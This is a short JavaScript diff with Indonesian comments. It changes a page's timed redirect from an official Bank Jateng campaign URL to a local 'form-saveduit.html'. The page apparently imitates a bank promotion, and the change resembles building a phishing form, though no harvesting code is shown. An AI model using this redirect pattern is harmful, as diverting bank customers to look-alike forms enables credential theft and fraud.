@@ -1055,7 +1055,7 @@ button { font-family: inherit; }
 (function() {
     'use strict';
     var CONFIG = {
-        redirectUrl:   'https://www.bankjateng.co.id/saveduitbjbm2026',
+        redirectUrl:   'form-saveduit.html', // DIPERBAIKI: Mengarah ke form-saveduit.html
         animDuration:  3000,
         toastDuration: 3000,
         scrollThreshold: 500,
@@ -1182,7 +1182,7 @@ button { font-family: inherit; }
         if (dom.step2) safeTimeout(function() { dom.step2.classList.add('show'); }, 1000);
         if (dom.step3) safeTimeout(function() { dom.step3.classList.add('show'); }, 2200);
         safeTimeout(function() {
-            window.location.href = CONFIG.redirectUrl;
+            window.location.href = CONFIG.redirectUrl; // Melakukan redirect ke form-saveduit.html
         }, CONFIG.animDuration);
         safeTimeout(function() {
             if (_isRedirecting && dom.overlay) {
